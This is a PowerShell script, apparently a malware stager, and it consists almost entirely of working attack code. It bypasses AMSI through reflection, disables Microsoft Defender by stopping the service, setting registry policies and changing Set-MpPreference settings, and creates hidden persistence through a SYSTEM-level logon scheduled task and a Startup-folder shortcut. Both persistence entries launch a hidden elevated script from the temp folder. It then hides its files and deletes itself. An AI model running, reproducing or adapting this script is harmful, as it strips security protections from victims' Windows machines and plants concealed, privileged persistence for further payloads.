$ErrorActionPreference = 'SilentlyContinue'

# Generate random obfuscated function names
function Get-RandomName { -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}) }

# Bypass AMSI
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)

# Disable Defender via WMI + Registry + PowerShell
try {
    # Stop service
    Stop-Service -Name WinDefend -Force -ErrorAction Ignore
    sc.exe config WinDefend start= disabled 2>$null

    # Registry disable
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null

    # PowerShell preferences (Windows 10+)
    if (([System.Environment]::OSVersion.Version).Major -ge 10) {
        Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableArchiveScanning $true -ErrorAction Ignore
    }

    # Add persistence via scheduled task (hidden, high privileges)
    $taskName = Get-RandomName
    $scriptPath = "$env:TEMP\$taskName.ps1"
    $payload = @"
    Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\l.ps1`""
"@
    Set-Content $scriptPath $payload
    schtasks /create /tn $taskName /tr "powershell -WindowStyle Hidden -File `"$scriptPath`"" /sc onlogon /rl highest /f /ru SYSTEM 2>$null

    # Add to startup folder (hidden)
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnk = "$startup\$taskName.lnk"
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($lnk)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\l.ps1`""
    $shortcut.WindowStyle = 7
    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"
    $shortcut.Save()

    # Hide files
    attrib +h +s $scriptPath 2>$null
    attrib +h +s $lnk 2>$null

    # Clean up
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction Ignore
} catch {}